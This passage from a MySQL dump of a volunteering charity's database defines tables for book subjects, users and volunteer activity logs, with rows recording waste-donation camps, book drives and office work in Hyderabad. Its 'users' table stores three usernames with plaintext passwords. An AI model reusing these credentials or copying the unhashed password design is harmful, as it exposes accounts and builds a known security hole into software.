(3, 'Fiction'),
(4, 'Non-fiction'),
(5, 'Language'),
(6, 'Activity'),
(7, 'Education');

-- --------------------------------------------------------

--
-- Table structure for table `uc_subject`
--

CREATE TABLE IF NOT EXISTS `uc_subject` (
  `subjectid` int(11) NOT NULL AUTO_INCREMENT,
  `categoryid` int(20) NOT NULL,
  `subjectname` varchar(50) NOT NULL,
  PRIMARY KEY (`subjectid`),
  KEY `categoryid` (`categoryid`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=30 ;

--
-- Dumping data for table `uc_subject`
--

INSERT INTO `uc_subject` (`subjectid`, `categoryid`, `subjectname`) VALUES
(1, 1, 'General'),
(2, 1, 'HR'),
(3, 1, 'Economics'),
(4, 2, 'Story'),
(5, 2, 'Novel'),
(6, 3, 'Mystery'),
(7, 3, 'Science'),
(8, 4, 'Documentary'),
(9, 4, 'History'),
(10, 4, 'Biography'),
(11, 4, 'Self Help'),
(12, 5, 'Language'),
(13, 1, 'Law'),
(14, 1, 'Marketing'),
(15, 4, 'General'),
(16, 2, 'Math'),
(17, 2, 'Geography'),
(18, 2, 'Science'),
(19, 2, 'Physics'),
(20, 2, 'Social Science'),
(21, 2, 'Chemistry'),
(22, 3, 'General'),
(23, 6, 'General'),
(24, 2, 'English'),
(25, 2, 'History'),
(26, 7, 'Information Technology'),
(27, 7, 'Engineering'),
(28, 7, 'Law'),
(29, 7, 'Finance and Accounts');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `user_id` int(7) NOT NULL AUTO_INCREMENT,
  `user_type_id` int(1) NOT NULL,
  `username` varchar(32) NOT NULL,
  `password` varchar(65) NOT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=236 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `user_type_id`, `username`, `password`) VALUES
(26, 0, 'shravan', 'yousee2012'),
(27, 0, 'sunil', 'sunilyousee'),
(29, 0, 'serene', 'county');

-- --------------------------------------------------------

--
-- Table structure for table `volunteering`
--

CREATE TABLE IF NOT EXISTS `volunteering` (
  `volunteer_act_id` int(4) NOT NULL AUTO_INCREMENT,
  `donor_id` varchar(4) COLLATE utf8_bin NOT NULL,
  `from_date` date NOT NULL,
  `to_date` date NOT NULL,
  `from_time` time DEFAULT NULL,
  `to_time` time DEFAULT NULL,
  `hours` decimal(10,0) NOT NULL,
  `donation_type` varchar(20) COLLATE utf8_bin NOT NULL,
  `area` varchar(50) COLLATE utf8_bin NOT NULL,
  `activity_done` varchar(500) COLLATE utf8_bin NOT NULL,
  `onsite_offsite` varchar(10) COLLATE utf8_bin NOT NULL,
  `location` varchar(30) COLLATE utf8_bin NOT NULL,
  `organisation` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `notes` varchar(500) COLLATE utf8_bin DEFAULT NULL,
  `project_id` int(3) NOT NULL,
  PRIMARY KEY (`volunteer_act_id`),
  KEY `volunteer_donor` (`donor_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Volunteers additional info. Volunteer is also recorded as Do' AUTO_INCREMENT=1446 ;

--
-- Dumping data for table `volunteering`
--

INSERT INTO `volunteering` (`volunteer_act_id`, `donor_id`, `from_date`, `to_date`, `from_time`, `to_time`, `hours`, `donation_type`, `area`, `activity_done`, `onsite_offsite`, `location`, `organisation`, `notes`, `project_id`) VALUES
(1, '78', '2012-01-27', '2012-01-27', '00:00:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', 'VR4U', '', 7),
(2, '79', '2012-01-28', '2012-01-28', '12:00:00', '14:00:00', '2', 'Shram Daan', 'Environment', 'Shifting clothes to Goonj office', 'Onsite', 'Hyderabad', 'Google', '', 7),
(3, '80', '2012-01-28', '2012-01-28', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Shifting clothes to Goonj office', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(4, '81', '2012-01-29', '2012-01-29', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Operations', 'Shifting UC office material', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(5, '80', '2012-01-29', '2012-01-29', '08:00:00', '15:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(6, '82', '2012-01-29', '2012-01-29', '08:00:00', '15:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(7, '83', '2012-01-29', '2012-01-29', '08:00:00', '15:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(8, '84', '2012-01-29', '2012-01-29', '08:00:00', '15:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(9, '85', '2012-01-29', '2012-01-29', '08:00:00', '15:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(10, '86', '2012-02-04', '2012-02-04', '12:00:00', '16:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at LaMakaan', 'Onsite', 'Hyderabad', NULL, '', 7),
(11, '86', '2011-11-01', '2011-11-01', '00:00:00', '00:00:00', '5', 'Gyan Daan', 'Promotion', 'AdWords - Basic Structure', 'Offsite', 'Hyderabad', NULL, '', 0),
(12, '86', '2011-11-13', '2011-11-13', '00:00:00', '00:00:00', '4', 'Gyaan Daan', 'Promotion', 'Adwords - CSR & Charity', 'Offsite', 'Hyderabad', NULL, '', 0),
(13, '86', '2011-12-04', '2011-12-04', '00:00:00', '00:00:00', '4', 'Gyan Daan', 'Promotion', 'AdWords - Waste Donation', 'Offsite', 'Hyderabad', NULL, '', 0),
(14, '86', '2011-12-06', '2011-12-06', '00:00:00', '00:00:00', '2', 'Gyann Daan', 'Promotion', 'Adwords - Tax', 'Offsite', 'Hyderabad', NULL, '', 0),
(15, '86', '2011-12-17', '2011-12-17', '00:00:00', '00:00:00', '4', 'Gyan Daan', 'Promotion', 'Adwords - YouSee Brand', 'Offsite', 'Hyderabad', NULL, '', 0),
(16, '86', '2011-12-23', '2011-12-23', '00:00:00', '00:00:00', '2', 'Gyan Daan', 'Promotion', 'Keyword addition', 'Offsite', 'Hyderabad', NULL, '', 0),
(17, '86', '2011-12-27', '2011-12-27', '00:00:00', '00:00:00', '2', 'Gyan Daan', 'Promotion', 'Keyword addition', 'Offsite', 'Hyderabad', NULL, '', 0),
(18, '86', '2012-01-15', '2012-01-15', '00:00:00', '00:00:00', '4', 'Gyann Daan', 'Promotion', 'Book Donation', 'Offsite', 'Hyderabad', NULL, '', 0),
(19, '86', '2012-01-28', '2012-01-28', '00:00:00', '00:00:00', '1', 'Gyan Daan', 'Promotion', 'Keyword addition', 'Offsite', 'Hyderabad', NULL, '', 0),
(20, '80', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(21, '80', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(22, '80', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(23, '78', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'VR4U', '', 7),
(24, '78', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'VR4U', '', 7),
(25, '78', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', 'VR4U', '', 7),
(26, '81', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '10', 'Both', 'Accounts', 'UC accounts work', 'Onsite', 'Hyderabad', NULL, '', 0),
(27, '81', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '10', 'Both', 'Accounts', 'UC accounts work', 'Onsite', 'Hyderabad', NULL, '', 0),
(28, '81', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '10', 'Both', 'Accounts', 'UC accounts work', 'Onsite', 'Hyderabad', NULL, '', 0),
(29, '89', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(30, '89', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(31, '89', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(32, '89', '2012-01-21', '2012-01-21', '08:30:00', '11:30:30', '3', 'Both', 'Education', 'Learning assessment at Gowlidoddi school', 'Onsite', 'Hyderabad', NULL, '', 0),
(33, '85', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation Camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(34, '90', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(35, '91', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(36, '92', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(37, '93', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(38, '94', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(39, '95', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(40, '96', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(41, '97', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(42, '98', '2012-01-21', '2012-01-21', '09:00:00', '12:00:00', '3', 'Both', 'Education', 'Learning Assessment at Gowlidoddi School', 'Onsite', 'Hyderabad', NULL, '', 0),
(43, '99', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '5', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(44, '99', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '5', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(45, '99', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '5', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(46, '99', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '1', 'Both', 'Promotion', 'UC FaceBook updates', 'Offsite', 'Hyderabad', NULL, '', 0),
(47, '99', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '1', 'Both', 'Promotion', 'UC FaceBook updates', 'Offsite', 'Hyderabad', NULL, '', 0),
(48, '100', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '4', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(49, '100', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '4', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(50, '100', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '4', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(51, '101', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '3', 'Shram Daan', 'Environment', 'Organizing Waste Donation camps', 'Onsite', 'Hyderabad', NULL, '', 7),
(52, '102', '2012-02-02', '2012-02-02', '00:00:00', '00:00:00', '3', 'Shram Daan', 'Environment', 'Survey of Re-cyclers', 'Onsite', 'Delhi', NULL, '', 7),
(53, '104', '2012-02-17', '2012-02-17', '13:00:00', '14:00:00', '1', 'Shram Daan', 'Operations', 'Project analysis on Maitiri program', 'Offsite', 'Hyderabad', 'ABS', '', 0),
(54, '81', '2012-02-17', '2012-02-17', '17:00:00', '18:00:00', '3', 'Shram Daan', 'Operations', 'Shifting and setting up new YouSee work location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(55, '105', '2012-02-17', '2012-02-17', '17:00:00', '18:00:00', '3', 'Shram Daan', 'Operations', 'Shifting and setting up new YouSee work location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(56, '85', '2012-02-17', '2012-02-17', '17:00:00', '18:00:00', '3', 'Shram Daan', 'Operations', 'Shifting and setting up new YouSee work location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(57, '80', '2012-02-17', '2012-02-17', '14:00:00', '15:00:00', '1', 'Shram Daan', 'Operations', 'Shifting and setting up new YouSee work location', 'Onsite', 'Hyderabad', 'ABS', 'Visit to BASIX office for furniture', 0),
(58, '105', '2012-02-18', '2012-02-18', '15:00:00', '16:00:00', '1', 'Shram Daan', 'Operations', 'Shifting and setting up new YouSee work location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(59, '85', '2012-02-18', '2012-02-18', '18:00:00', '19:00:00', '1', 'Shram Daan', 'Operations', 'Working on yousee volunteering contributions data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(60, '106', '2011-10-01', '2011-10-31', '00:00:00', '00:00:00', '10', 'Gyan Daan', 'IT', 'UC Website and Database development', 'Offsite', 'San Fransisco', NULL, '', 0),
(61, '106', '2011-11-01', '2011-11-30', '00:00:00', '00:00:00', '10', 'Gyan Daan', 'IT', 'UC Website and Database development', 'Offsite', 'San Fransisco', NULL, '', 0),
(62, '106', '2011-12-01', '2011-12-31', '00:00:00', '00:00:00', '10', 'Gyan Daan', 'IT', 'UC Website and Database development', 'Offsite', 'San Fransisco', NULL, '', 0),
(63, '106', '2012-01-01', '2012-01-31', '00:00:00', '00:00:00', '10', 'Gyan Daan', 'IT', 'UC Website and Database development', 'Offsite', 'San Fransisco', NULL, '', 0),
(64, '86', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(65, '84', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(66, '85', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(67, '99', '2012-02-26', '2012-02-26', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(68, '83', '2012-02-25', '2012-02-25', '10:30:00', '01:30:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(69, '127', '2012-02-25', '2012-02-25', '10:30:00', '01:30:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', '', '', 7),
(70, '78', '2012-02-25', '2012-02-25', '10:30:00', '01:30:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', '', '', 7),
(71, '99', '2012-02-25', '2012-02-25', '16:00:00', '19:00:00', '3', 'Shram Daan', 'Operations', 'Managing YouSee stall at INVESCO company event', 'Onsite', 'Hyderabad', '', '', 0),
(72, '99', '2012-02-25', '2012-02-25', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', '', '', 7),
(73, '104', '2012-02-17', '2012-02-17', '13:00:00', '14:00:00', '1', 'Gyan Daan', 'Operations', 'Maitri project analysis', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(74, '84', '2012-02-19', '2012-02-19', '14:00:00', '15:00:00', '1', 'both', 'Operations', 'Working on YouSee volunteering contributions data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(75, '85', '2012-02-19', '2012-02-19', '14:00:00', '16:00:00', '2', 'both', 'Operations', 'Working on YouSee volunteering contributions data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(76, '80', '2012-02-20', '2012-02-20', '11:00:00', '14:00:00', '3', 'Shram Daan', 'Operations', 'Setting up new YouSee location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(77, '85', '2012-02-20', '2012-02-20', '11:00:00', '14:00:00', '3', 'Shram Daan', 'Operations', 'Setting up new YouSee location', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(78, '105', '2012-02-20', '2012-02-20', '14:00:00', '15:00:00', '1', 'Gyan Daan', 'Operations', 'Analysis of YouSee Indore project data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(79, '85', '2012-02-21', '2012-02-21', '18:00:00', '19:00:00', '1', 'both', 'Operations', 'Working on YouSee volunteering contributions data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(80, '81', '2012-02-21', '2012-02-21', '17:00:00', '19:00:00', '2', 'Gyan Daan', 'Operations', 'Accounts support for YouSee partner Adhya', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(81, '84', '2012-02-23', '2012-02-23', '18:00:00', '20:00:00', '2', 'Shram Daan', 'Operations', 'Working on YouSee volunteering contributions data', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(82, '86', '2012-02-25', '2012-02-25', '13:00:00', '19:00:00', '6', 'Shram Daan', 'Operations', 'Managing YouSee stall at INVESCO company event', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(83, '118', '2012-03-03', '2012-03-03', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Operations', 'Transporting Clothes donated at PadmaraoNagar to Goonj\n', 'Offsite', 'Hyderabad', 'Google', '', 0),
(84, '89', '2012-03-03', '2012-03-03', '09:00:00', '12:00:00', '3', 'Shram Daan', 'Operations', 'Transporting Clothes donated at PadmaraoNagar to Goonj\n', 'Offsite', 'Hyderabad', 'Infosys', '', 0),
(85, '78', '2012-02-29', '2012-02-29', '08:00:00', '12:00:00', '4', 'Shram Daan', 'Environment', 'Suppport of setting up composting center', 'Onsite', 'Hyderabad', '', '', 7),
(86, '81', '2012-02-27', '2012-02-28', '13:00:00', '15:00:00', '2', 'Gyan Daan', 'Operations', 'UC accounts work', 'Offsite', 'Hyderabad', 'ABS', '', 0),
(87, '117', '2012-02-26', '2012-02-26', '12:00:00', '15:00:00', '3', 'Shram Daan', 'Operations', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(88, '116', '2012-02-26', '2012-02-26', '13:30:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(89, '115', '2012-02-26', '2012-02-26', '12:00:00', '18:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(90, '114', '2012-02-26', '2012-02-26', '12:00:00', '18:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(91, '113', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', '', '', 7),
(92, '112', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', '', '', 7),
(93, '83', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(94, '82', '2012-02-26', '2012-02-26', '08:00:00', '18:00:00', '10', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(95, '119', '2012-03-03', '2012-03-03', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Operations', 'Transporting Clothes donated at PadmaraoNagar to Goonj\n', 'Offsite', 'Hyderabad', 'Google', '', 0),
(96, '86', '2012-03-03', '2012-03-03', '14:00:00', '16:00:00', '2', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at GoodSeedBazaar - Banjara Hills (Lamakaan)', 'Offsite', 'Hyderabad', 'Google', '', 7),
(97, '114', '2012-03-03', '2012-03-03', '19:00:00', '20:00:00', '1', 'Gyan Daan', 'Operations', 'Planning of Book donation camp at UC office', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(98, '115', '2012-03-03', '2012-03-03', '19:00:00', '20:00:00', '1', 'Gyan Daan', 'Operations', 'Planning of Book donation camp at UC office', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(99, '120', '2012-03-03', '2012-03-03', '19:00:00', '20:00:00', '1', 'Gyan Daan', 'Operations', 'Planning of Book donation camp at UC office', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(100, '121', '2012-03-04', '2012-03-04', '13:00:00', '14:00:00', '1', 'Gyan Daan', 'Operations', 'Preparation of UC documents for Health Project at UC office', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(101, '84', '2012-03-04', '2012-03-04', '10:00:00', '12:00:00', '2', 'Gyan Daan', 'Environment', 'Planning for Waste Donation Camps at UC office', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(102, '122', '2012-03-05', '2012-03-05', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Visit for maintenance of Composting Center', 'Offsite', 'Hyderabad', '', '', 7),
(103, '123', '2012-03-06', '2012-03-06', '16:00:00', '18:00:00', '2', 'Gyan Daan', 'IT', 'Development of applications for UC Website', 'Offsite', 'Hyderabad', 'Winnou', '', 0),
(104, '81', '2012-03-06', '2012-03-06', '18:00:00', '19:00:00', '1', 'Shram Daan', 'Operations', 'UC office set up activities', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(105, '123', '2012-03-07', '2012-03-07', '17:00:00', '19:00:00', '2', 'Gyan Daan', 'IT', 'Development of applications for UC Website', 'Offsite', 'Hyderabad', 'Winnou', '', 0),
(106, '137', '2012-03-25', '2012-03-25', '09:00:00', '16:00:00', '7', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'Infosys', NULL, 7),
(107, '100', '2012-03-25', '2012-03-25', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'HillRidgeSprings', NULL, 7),
(108, '100', '2012-01-29', '2012-01-29', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'HillRidgeSprings', NULL, 7),
(109, '100', '2012-02-26', '2012-02-26', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', NULL, NULL, 7),
(110, '81', '2012-03-31', '2012-03-31', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(111, '81', '2012-03-25', '2012-03-25', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Organising waste donation camp at Panjagutta', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(112, '81', '2012-02-26', '2012-02-26', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Organising waste donation camp at Panjagutta', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(113, '81', '2012-04-05', '2012-04-05', '00:00:00', '00:00:00', '5', 'Gyan Daan', 'Operations', 'UC accounts work', 'Offsite', 'Hyderabad', 'ABS', '', 0),
(114, '81', '2012-04-06', '2012-04-06', '11:00:00', '20:00:00', '9', 'Gyan Daan', 'Accounts', 'UC accounts work', 'Onsite', 'Hyderabad', 'ABS', 'UC audit work', 0),
(115, '81', '2012-04-07', '2012-04-07', '14:00:00', '19:00:00', '5', 'Gyan Daan', 'Accounts', 'UC accounts work', 'Onsite', 'Hyderabad', 'ABS', 'UC audit work', 0),
(116, '81', '2012-03-15', '2012-03-31', '00:00:00', '00:00:00', '4', 'Both', 'Operations', 'UC office support and Accounts', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(117, '81', '2012-04-01', '2012-04-04', '00:00:00', '00:00:00', '6', 'Both', 'Operations', 'UC office support and Accounts', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(118, '84', '2012-03-17', '2012-03-17', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(119, '85', '2012-03-17', '2012-03-17', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(120, '82', '2012-03-16', '2012-03-16', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(121, '116', '2012-03-16', '2012-03-16', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(122, '140', '2012-03-16', '2012-03-16', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(123, '129', '2012-03-16', '2012-03-16', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(124, '141', '2012-03-16', '2012-03-16', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(125, '115', '2012-03-16', '2012-03-16', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(126, '85', '2012-03-16', '2012-03-16', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(127, '84', '2012-03-16', '2012-03-16', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(128, '114', '2012-03-16', '2012-03-16', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(129, '139', '2012-03-25', '2012-03-25', '09:00:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(130, '116', '2012-03-25', '2012-03-25', '17:00:00', '18:00:00', '1', 'Shram Daan', 'Environment', 'Data Entry and PPT presentation acknowledgement for 25th march Waste Donation Camps', 'Offsite', 'Hyderabad', 'ABS', '', 7),
(131, '115', '2012-03-25', '2012-03-25', '09:00:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(132, '120', '2012-03-25', '2012-03-25', '09:00:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(133, '114', '2012-03-25', '2012-03-25', '09:00:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
